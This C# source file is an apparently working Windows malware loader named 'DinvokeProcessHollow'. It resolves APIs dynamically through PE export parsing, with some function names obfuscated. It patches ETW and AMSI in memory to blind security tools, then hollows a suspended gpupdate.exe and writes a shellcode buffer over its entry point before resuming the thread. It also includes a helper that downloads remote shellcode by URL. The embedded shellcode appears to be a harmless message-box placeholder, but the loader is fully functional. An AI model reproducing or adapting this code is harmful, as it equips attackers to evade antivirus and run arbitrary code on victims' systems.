using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

public class Invoke
{

    public static STRUCTS.NTSTATUS aldksjDll(IntPtr PathToFile, UInt32 dwFlags, ref STRUCTS.UNICODE_STRING ModuleFileName, ref IntPtr ModuleHandle)
    {
        // Craft an array for the arguments
        object[] funcargs =
        {
                PathToFile, dwFlags, ModuleFileName, ModuleHandle
            };

        STRUCTS.NTSTATUS retValue = (STRUCTS.NTSTATUS)dlskfdjInvoke(@"ntdll.dll", @"aldksjDll", typeof(DELEGATES.RtlInitUnicodeString), ref funcargs);

        // Update the modified variables
        ModuleHandle = (IntPtr)funcargs[3];

        return retValue;
    }

    public static void RtlInitUnicodeString(ref STRUCTS.UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPWStr)] string SourceString)
    {
        // Craft an array for the arguments
        object[] funcargs =
        {
                DestinationString, SourceString
            };

        dlskfdjInvoke(@"ntdll.dll", @"RtlInitUnicodeString", typeof(DELEGATES.RtlInitUnicodeString), ref funcargs);

        // Update the modified variables
        DestinationString = (STRUCTS.UNICODE_STRING)funcargs[0];
    }


    public static object dlskfdjInvoke(string DLLName, string FunctionName, Type FunctionDelegateType, ref object[] Parameters)
    {
        IntPtr pFunction = GetLibraryAddress(DLLName, FunctionName);
        return DynamicFunctionInvoke(pFunction, FunctionDelegateType, ref Parameters);
    }

    public static object DynamicFunctionInvoke(IntPtr FunctionPointer, Type FunctionDelegateType, ref object[] Parameters)
    {
        Delegate funcDelegate = Marshal.GetDelegateForFunctionPointer(FunctionPointer, FunctionDelegateType);
        return funcDelegate.DynamicInvoke(Parameters);
    }


    public static IntPtr LoadModuleFromDisk(string DLLPath)
    {
        STRUCTS.UNICODE_STRING uModuleName = new STRUCTS.UNICODE_STRING();
        RtlInitUnicodeString(ref uModuleName, DLLPath);

        IntPtr hModule = IntPtr.Zero;
        STRUCTS.NTSTATUS CallResult = aldksjDll(IntPtr.Zero, 0, ref uModuleName, ref hModule);
        if (CallResult != STRUCTS.NTSTATUS.Success || hModule == IntPtr.Zero)
        {
            return IntPtr.Zero;
        }

        return hModule;
    }

    public static IntPtr GetLoadedModuleAddress(string DLLName)
    {
        ProcessModuleCollection ProcModules = Process.GetCurrentProcess().Modules;
        foreach (ProcessModule Mod in ProcModules)
        {
            if (Mod.FileName.ToLower().EndsWith(DLLName.ToLower()))
            {
                return Mod.BaseAddress;
            }
        }
        return IntPtr.Zero;
    }

    public static IntPtr GetLibraryAddress(string DLLName, string FunctionName, bool CanLoadFromDisk = false)
    {
        IntPtr hModule = GetLoadedModuleAddress(DLLName);
        if (hModule == IntPtr.Zero && CanLoadFromDisk)
        {
            hModule = LoadModuleFromDisk(DLLName);
            if (hModule == IntPtr.Zero)
            {
                throw new FileNotFoundException(DLLName + ", fdsdfdf.");
            }
        }
        else if (hModule == IntPtr.Zero)
        {
            throw new DllNotFoundException(DLLName + ", sdfsdfd.");
        }

        return GetExportAddress(hModule, FunctionName);
    }

    public static IntPtr GetExportAddress(IntPtr ModuleBase, string ExportName)
    {
        IntPtr FunctionPtr = IntPtr.Zero;
        try
        {
            // Traverse the PE header in memory
            Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
            Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
            Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
            Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
            Int64 pExport = 0;
            if (Magic == 0x010b)
            {
                pExport = OptHeader + 0x60;
            }
            else
            {
                pExport = OptHeader + 0x70;
            }

            // Read -> IMAGE_EXPORT_DIRECTORY
            Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
            Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
            Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
            Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
            Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
            Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
            Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));

            // Loop the array of export name RVA's
            for (int i = 0; i < NumberOfNames; i++)
            {
                string FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));
                if (FunctionName.Equals(ExportName, StringComparison.OrdinalIgnoreCase))
                {
                    Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
                    Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
                    FunctionPtr = (IntPtr)((Int64)ModuleBase + FunctionRVA);
                    break;
                }
            }
        }
        catch
        {
            // Catch parser failure
            throw new InvalidOperationException("qqqqqqqqqqqqqqqqq");
        }

        if (FunctionPtr == IntPtr.Zero)
        {
            // Export not found
            throw new MissingMethodException(ExportName + ", qqqqqqqqqqqqq.");
        }
        return FunctionPtr;
    }

}
public class STRUCTS
{

    [Flags]
    public enum ProcessCreationFlags : uint
    {
        ZERO_FLAG = 0x00000000,
        CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
        CREATE_DEFAULT_ERROR_MODE = 0x04000000,
        CREATE_NEW_CONSOLE = 0x00000010,
        CREATE_NEW_PROCESS_GROUP = 0x00000200,
        CREATE_NO_WINDOW = 0x08000000,
        CREATE_PROTECTED_PROCESS = 0x00040000,
        CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
        CREATE_SEPARATE_WOW_VDM = 0x00001000,
        CREATE_SHARED_WOW_VDM = 0x00001000,
        CREATE_SUSPENDED = 0x00000004,
        CREATE_UNICODE_ENVIRONMENT = 0x00000400,
        DEBUG_ONLY_THIS_PROCESS = 0x00000002,
        DEBUG_PROCESS = 0x00000001,
        DETACHED_PROCESS = 0x00000008,
        EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
        INHERIT_PARENT_AFFINITY = 0x00010000
    }

    [Flags]
    public enum ThreadAccess : int
    {
        TERMINATE = (0x0001),
        SUSPEND_RESUME = (0x0002),
        GET_CONTEXT = (0x0008),
        SET_CONTEXT = (0x0010),
        SET_INFORMATION = (0x0020),
        QUERY_INFORMATION = (0x0040),
        SET_THREAD_TOKEN = (0x0080),
        IMPERSONATE = (0x0100),
        DIRECT_IMPERSONATION = (0x0200),
        THREAD_HIJACK = SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT,
        THREAD_ALL = TERMINATE | SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT | SET_INFORMATION | QUERY_INFORMATION | SET_THREAD_TOKEN | IMPERSONATE | DIRECT_IMPERSONATION
    }
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }

    public struct PROCESS_BASIC_INFORMATION
    {
        public STRUCTS.NTSTATUS ExitStatus;
        public IntPtr PebBaseAddress;
        public UIntPtr AffinityMask;
        public int BasePriority;
        public UIntPtr UniqueProcessId;
        public UIntPtr InheritedFromUniqueProcessId;
    }


    public struct SECURITY_ATTRIBUTES
    {
        public int nLength;
        public IntPtr lpSecurityDescriptor;
        public int bInheritHandle;
    }


    public struct STARTUPINFO
    {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct UNICODE_STRING
    {
        public UInt16 Length;
        public UInt16 MaximumLength;
        public IntPtr Buffer;
    }

    public enum NTSTATUS : uint
    {
        // Success
        Success = 0x00000000,
        Wait0 = 0x00000000,
        Wait1 = 0x00000001,
        Wait2 = 0x00000002,
        Wait3 = 0x00000003,
        Wait63 = 0x0000003f,
        Abandoned = 0x00000080,
        AbandonedWait0 = 0x00000080,
        AbandonedWait1 = 0x00000081,
        AbandonedWait2 = 0x00000082,
        AbandonedWait3 = 0x00000083,
        AbandonedWait63 = 0x000000bf,
        UserApc = 0x000000c0,
        KernelApc = 0x00000100,
        Alerted = 0x00000101,
        Timeout = 0x00000102,
        Pending = 0x00000103,
        Reparse = 0x00000104,
        MoreEntries = 0x00000105,
        NotAllAssigned = 0x00000106,
        SomeNotMapped = 0x00000107,
        OpLockBreakInProgress = 0x00000108,
        VolumeMounted = 0x00000109,
        RxActCommitted = 0x0000010a,
        NotifyCleanup = 0x0000010b,
        NotifyEnumDir = 0x0000010c,
        NoQuotasForAccount = 0x0000010d,
        PrimaryTransportConnectFailed = 0x0000010e,
        PageFaultTransition = 0x00000110,
        PageFaultDemandZero = 0x00000111,
        PageFaultCopyOnWrite = 0x00000112,
        PageFaultGuardPage = 0x00000113,
        PageFaultPagingFile = 0x00000114,
        CrashDump = 0x00000116,
        ReparseObject = 0x00000118,
        NothingToTerminate = 0x00000122,
        ProcessNotInJob = 0x00000123,
        ProcessInJob = 0x00000124,
        ProcessCloned = 0x00000129,
        FileLockedWithOnlyReaders = 0x0000012a,
        FileLockedWithWriters = 0x0000012b,

        // Informational
        Informational = 0x40000000,
        ObjectNameExists = 0x40000000,
        ThreadWasSuspended = 0x40000001,
        WorkingSetLimitRange = 0x40000002,
        ImageNotAtBase = 0x40000003,
        RegistryRecovered = 0x40000009,

        // Warning
        Warning = 0x80000000,
        GuardPageViolation = 0x80000001,
        DatatypeMisalignment = 0x80000002,
        Breakpoint = 0x80000003,
        SingleStep = 0x80000004,
        BufferOverflow = 0x80000005,
        NoMoreFiles = 0x80000006,
        HandlesClosed = 0x8000000a,
        PartialCopy = 0x8000000d,
        DeviceBusy = 0x80000011,
        InvalidEaName = 0x80000013,
        EaListInconsistent = 0x80000014,
        NoMoreEntries = 0x8000001a,
        LongJump = 0x80000026,
        DllMightBeInsecure = 0x8000002b,

        // Error


        MaximumNtStatus = 0xffffffff
    }



}

public class DELEGATES
{

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    //public delegate Boolean CreatePrddoess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, STRUCTS.ProcessCreationFlags dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STRUCTS.STARTUPINFO lpStartupInfo, out STRUCTS.PROCESS_INFORMATION lpProcessInformation);
    public delegate Boolean CreateProcess(string lpApplicationName, string lpCommandLine, ref STRUCTS.SECURITY_ATTRIBUTES lpProcessAttributes, ref STRUCTS.SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, STRUCTS.ProcessCreationFlags dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STRUCTS.STARTUPINFO lpStartupInfo, out STRUCTS.PROCESS_INFORMATION lpProcessInformation);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate UInt32 ZwQueryInformationProcess(IntPtr hProcess, Int32 procInformationClass, ref STRUCTS.PROCESS_BASIC_INFORMATION procInformation, UInt32 ProcInfoLen, ref UInt32 retlen);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesRead);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate IntPtr OpenThread(STRUCTS.ThreadAccess dwDesiredAccess, bool bInheritHandle, int dwThreadId);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate Boolean VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, uint flNewProtect, out uint lpflOldProtect);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate Boolean VirtualProtect(IntPtr lpAddress, int dwSize, uint flNewProtect, out uint lpflOldProtect);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate STRUCTS.NTSTATUS NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref UInt32 NumberOfBytesToProtect, UInt32 NewAccessProtection, ref UInt32 OldAccessProtection);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate STRUCTS.NTSTATUS NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, UInt32 NumberOfBytesToWrite, ref UInt32 NumberOfBytesWritten);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate uint ResumeThread(IntPtr hThhread);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate UInt32 aldksjDll(IntPtr PathToFile, UInt32 dwFlags, ref STRUCTS.UNICODE_STRING ModuleFileName, ref IntPtr ModuleHandle);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate void RtlInitUnicodeString(ref STRUCTS.UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPWStr)] string SourceString);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)] string lpFileName);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate IntPtr GetProcAddress(IntPtr hModule, string procName);

}
namespace DinvokeProcessHollow
{
    class Program
    {
        public static void PatchETW()
        {

            IntPtr funcPtr = Invoke.GetLibraryAddress("kernel32.dll", "VirtualProtect");
            DELEGATES.VirtualProtect VirtualProtect = Marshal.GetDelegateForFunctionPointer(funcPtr, typeof(DELEGATES.VirtualProtect)) as DELEGATES.VirtualProtect;

            IntPtr pEtwEventSend = Invoke.GetLibraryAddress("ntdll.dll", "EtwEventWrite");
            IntPtr pVirtualProtect = Invoke.GetLibraryAddress("kernel32.dll", "VirtualProtect");

            var patch = getETWPayload();
            uint oldProtect;

            if (VirtualProtect(pEtwEventSend, patch.Length, 0x40, out oldProtect))
            {
                Marshal.Copy(patch, 0, pEtwEventSend, patch.Length);
                Console.WriteLine("[+] Successfully unhooked ETW!");
            }

            else
                Console.WriteLine("[-] Error unhooking ETW");
        }
        
        public static bool is64Bit()
        {
            if (IntPtr.Size == 4)
                return false;

            return true;
        }
        public static byte[] getETWPayload()
        {
            if (!is64Bit())
                return Convert.FromBase64String("whQA");
            return Convert.FromBase64String("ww==");
        }
        private static byte[] getAMSIPayload()
        {
            if (!is64Bit())
                return Convert.FromBase64String("uFcAB4DCGAA=");
            return Convert.FromBase64String("uFcAB4DD");
        }
        private static IntPtr unProtect(IntPtr amsiLibPtr)
        {

            IntPtr pVirtualProtect = Invoke.GetLibraryAddress("kernel32.dll", "VirtualProtect");

            DELEGATES.VirtualProtect fVirtualProtect = Marshal.GetDelegateForFunctionPointer(pVirtualProtect, typeof(DELEGATES.VirtualProtect)) as DELEGATES.VirtualProtect;

            uint newMemSpaceProtection = 0;
            if (fVirtualProtect(amsiLibPtr, getAMSIPayload().Length, 0x40, out newMemSpaceProtection))
            {
                return amsiLibPtr;
            }
            else
            {
                return (IntPtr)0;
            }

        }
        private static IntPtr getAMSILocation()
        {
            //GetProcAddress
            IntPtr pGetProcAddress = Invoke.GetLibraryAddress("kernel32.dll", "GetProcAddress");
            IntPtr pLoadLibrary = Invoke.GetLibraryAddress("kernel32.dll", "LoadLibraryA");

            DELEGATES.GetProcAddress fGetProcAddress = Marshal.GetDelegateForFunctionPointer(pGetProcAddress, typeof(DELEGATES.GetProcAddress)) as DELEGATES.GetProcAddress;
            DELEGATES.LoadLibrary fLoadLibrary = Marshal.GetDelegateForFunctionPointer(pLoadLibrary, typeof(DELEGATES.LoadLibrary)) as DELEGATES.LoadLibrary;

            return fGetProcAddress(fLoadLibrary("amsi.dll"), "AmsiScanBuffer");
        }
        private static void PatchAMSI()
        {

            IntPtr amsiLibPtr = unProtect(getAMSILocation());
            if (amsiLibPtr != (IntPtr)0)
            {
                Marshal.Copy(getAMSIPayload(), 0, amsiLibPtr, getAMSIPayload().Length);
                Console.WriteLine("[+] Successfully patched AMSI!");
            }
            else
            {
                Console.WriteLine("[!] Patching AMSI FAILED");
            }

        }
        public static void Main(string[] args)
        {

            PatchETW();
            PatchAMSI();

            System.Threading.Thread.Sleep(600);

            STRUCTS.STARTUPINFO si = new STRUCTS.STARTUPINFO();
            STRUCTS.PROCESS_INFORMATION pi = new STRUCTS.PROCESS_INFORMATION();
            STRUCTS.SECURITY_ATTRIBUTES lpa = new STRUCTS.SECURITY_ATTRIBUTES();
            STRUCTS.SECURITY_ATTRIBUTES lta = new STRUCTS.SECURITY_ATTRIBUTES();
            STRUCTS.PROCESS_BASIC_INFORMATION pbi = new STRUCTS.PROCESS_BASIC_INFORMATION();
            uint temp = 0;

            IntPtr funcPtr = Invoke.GetLibraryAddress("kernel32.dll", "ResumeThread");
            DELEGATES.ResumeThread ResumeThread = Marshal.GetDelegateForFunctionPointer(funcPtr, typeof(DELEGATES.ResumeThread)) as DELEGATES.ResumeThread;

            funcPtr = Invoke.GetLibraryAddress("Ntdll.dll", "ZwQueryInformationProcess");
            DELEGATES.ZwQueryInformationProcess ZwQueryInformationProcess = Marshal.GetDelegateForFunctionPointer(funcPtr, typeof(DELEGATES.ZwQueryInformationProcess)) as DELEGATES.ZwQueryInformationProcess;

            funcPtr = Invoke.GetLibraryAddress("kernel32.dll", "ReadProcessMemory");
            DELEGATES.ReadProcessMemory ReadProcessMemory = Marshal.GetDelegateForFunctionPointer(funcPtr, typeof(DELEGATES.ReadProcessMemory)) as DELEGATES.ReadProcessMemory;

            funcPtr = Invoke.GetLibraryAddress("kernel32.dll", "WriteProcessMemory");
            DELEGATES.WriteProcessMemory WriteProcessMemory = Marshal.GetDelegateForFunctionPointer(funcPtr, typeof(DELEGATES.WriteProcessMemory)) as DELEGATES.WriteProcessMemory;

            funcPtr = Invoke.GetLibraryAddress("kernel32.dll", "CreateProcessA");
            DELEGATES.CreateProcess CreateProcess = Marshal.GetDelegateForFunctionPointer(funcPtr, typeof(DELEGATES.CreateProcess)) as DELEGATES.CreateProcess;

            // bool succ = CreateProcess(null, "C:\\windows\\system32\\msdt.exe", ref lpa, ref lta, false, STRUCTS.ProcessCreationFlags.CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi);
            bool succ = CreateProcess(null, "C:\\windows\\system32\\gpupdate.exe", ref lpa, ref lta, false, STRUCTS.ProcessCreationFlags.CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi);
           

            UInt32 success = ZwQueryInformationProcess(pi.hProcess, 0x0, ref pbi, (uint)(IntPtr.Size * 6), ref temp);

            IntPtr ptrToBaseImage = (IntPtr)((Int64)pbi.PebBaseAddress + 0x10);
            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nread = IntPtr.Zero;

            succ = ReadProcessMemory(pi.hProcess, ptrToBaseImage, addrBuf, addrBuf.Length, out nread);
            /*           if (succ)
                       {
                           Console.WriteLine("Process Read");
                       }
              */
            IntPtr processBase = (IntPtr)BitConverter.ToInt64(addrBuf, 0);

            byte[] data = new byte[0x200];
            ReadProcessMemory(pi.hProcess, processBase, data, data.Length, out nread);

            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3c);
            uint opthdr = e_lfanew_offset + 0x28;
            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
            IntPtr addressofentrypoint = (IntPtr)(entrypoint_rva + (UInt64)processBase);

            funcPtr = Invoke.GetLibraryAddress("ntdll.dll", "NtProtectVirtualMemory");
            DELEGATES.NtProtectVirtualMemory NtProtectVirtualMemory = Marshal.GetDelegateForFunctionPointer(funcPtr, typeof(DELEGATES.NtProtectVirtualMemory)) as DELEGATES.NtProtectVirtualMemory;

            funcPtr = Invoke.GetLibraryAddress("ntdll.dll", "NtWriteVirtualMemory");
            DELEGATES.NtWriteVirtualMemory NtWriteVirtualMemory = Marshal.GetDelegateForFunctionPointer(funcPtr, typeof(DELEGATES.NtWriteVirtualMemory)) as DELEGATES.NtWriteVirtualMemory;

            IntPtr pEtwEventSend = Invoke.GetLibraryAddress("ntdll.dll", "EtwEventWrite");
            IntPtr pNtProtectVirtualMemory = Invoke.GetLibraryAddress("ntdll.dll", "NtProtectVirtualMemory");
            IntPtr pNtWriteVirtualMemory = Invoke.GetLibraryAddress("ntdll.dll", "NtWriteVirtualMemory");



            UInt32 memPage = 0x1000;
            var patch = getETWPayload();
            uint oldProtect = 0;
            uint aread = 0xFF; //used 0xFF as value of IntPtr.Zero is 8 bytes and value of 8 bytes in hex is 0xFF

            var retnt = NtProtectVirtualMemory(pi.hProcess, ref pEtwEventSend, ref memPage, 0x40, ref oldProtect);
            Console.WriteLine("[+] NtProtectVirtualMemory1: " + retnt);
            var retnt2 = NtWriteVirtualMemory(pi.hProcess, pEtwEventSend, patch, (uint)patch.Length, ref aread);
            Console.WriteLine("[+] NtProtectVirtualMemory1: " + retnt2);
            var retnt3 = NtProtectVirtualMemory(pi.hProcess, ref pEtwEventSend, ref memPage, oldProtect, ref oldProtect);
            Console.WriteLine("[+] Successfully unhooked Remote ETW!: " + retnt3);

            WriteProcessMemory(pi.hProcess, addressofentrypoint, buf(), buf().Length, out nread);
            ResumeThread(pi.hThread);
        }
        private static byte[] xor(byte[] cipher, byte[] key)
        {
            byte[] decrypted = new byte[cipher.Length];
            for (int i = 0; i < cipher.Length; i++)
            {
                decrypted[i] = (byte)(cipher[i] ^ key[i % key.Length]);
            }
            return decrypted;
        }
        public static byte[] GetRawShellcode(string url)
        {
            WebClient client = new WebClient();
            client.Proxy = WebRequest.GetSystemWebProxy();
            client.Proxy.Credentials = CredentialCache.DefaultCredentials;
            byte[] wellcode = client.DownloadData(url);

            return wellcode;
        }
        static byte[] buf()
        {
            var wc = new WebClient();
            wc.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36");

            byte[] sc = new byte[199] { 0x33, 0xc9, 0x64, 0x8b, 0x49, 0x30, 0x8b, 0x49, 0x0c, 0x8b, 0x49, 0x1c, 0x8b, 0x59, 0x08, 0x8b, 0x41, 0x20, 0x8b, 0x09, 0x80, 0x78, 0x0c, 0x33, 0x75, 0xf2, 0x8b, 0xeb, 0x03, 0x6d, 0x3c, 0x8b, 0x6d, 0x78, 0x03, 0xeb, 0x8b, 0x45, 0x20, 0x03, 0xc3, 0x33, 0xd2, 0x8b, 0x34, 0x90, 0x03, 0xf3, 0x42, 0x81, 0x3e, 0x47, 0x65, 0x74, 0x50, 0x75, 0xf2, 0x81, 0x7e, 0x04, 0x72, 0x6f, 0x63, 0x41, 0x75, 0xe9, 0x8b, 0x75, 0x24, 0x03, 0xf3, 0x66, 0x8b, 0x14, 0x56, 0x8b, 0x75, 0x1c, 0x03, 0xf3, 0x8b, 0x74, 0x96, 0xfc, 0x03, 0xf3, 0x33, 0xff, 0x57, 0x68, 0x61, 0x72, 0x79, 0x41, 0x68, 0x4c, 0x69, 0x62, 0x72, 0x68, 0x4c, 0x6f, 0x61, 0x64, 0x54, 0x53, 0xff, 0xd6, 0x33, 0xc9, 0x57, 0x66, 0xb9, 0x33, 0x32, 0x51, 0x68, 0x75, 0x73, 0x65, 0x72, 0x54, 0xff, 0xd0, 0x57, 0x68, 0x6f, 0x78, 0x41, 0x01, 0xfe, 0x4c, 0x24, 0x03, 0x68, 0x61, 0x67, 0x65, 0x42, 0x68, 0x4d, 0x65, 0x73, 0x73, 0x54, 0x50, 0xff, 0xd6, 0x57, 0x68, 0x72, 0x6c, 0x64, 0x21, 0x68, 0x6f, 0x20, 0x57, 0x6f, 0x68, 0x48, 0x65, 0x6c, 0x6c, 0x8b, 0xcc, 0x57, 0x57, 0x51, 0x57, 0xff, 0xd0, 0x57, 0x68, 0x65, 0x73, 0x73, 0x01, 0xfe, 0x4c, 0x24, 0x03, 0x68, 0x50, 0x72, 0x6f, 0x63, 0x68, 0x45, 0x78, 0x69, 0x74, 0x54, 0x53, 0xff, 0xd6, 0x57, 0xff, 0xd0 };
           
            return sc;
        }

    }
}